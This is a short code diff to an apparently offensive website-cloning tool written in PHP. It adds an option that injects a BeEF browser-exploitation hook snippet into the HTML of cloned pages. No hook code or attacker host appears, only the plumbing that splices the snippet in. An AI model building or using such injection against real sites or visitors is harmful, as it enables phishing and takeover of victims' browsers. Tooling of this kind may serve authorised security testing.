@@ -132,6 +132,17 @@ final class ClonedSite
             $html = strtr($html, $assetMap);
         }
 
+        // Phase 3.52 task 5: optional BeEF hook injection. The caller
+        // (dispatcher) decides whether to enable the hook for this clone
+        // and passes the snippet string in $opts['beef_hook_snippet'].
+        // We just splice it in — the policy / config / settings lookup
+        // lives at the dispatcher.
+        $beefSnippet = (string) ($this->opts['beef_hook_snippet'] ?? '');
+        if ($beefSnippet !== '') {
+            $html = site_cloner_inject_hook($html, $beefSnippet);
+            $warnings[] = 'Injected BeEF hook before </body>';
+        }
+
         file_put_contents($targetDir . '/index.html', $html);
 
         $meta = [
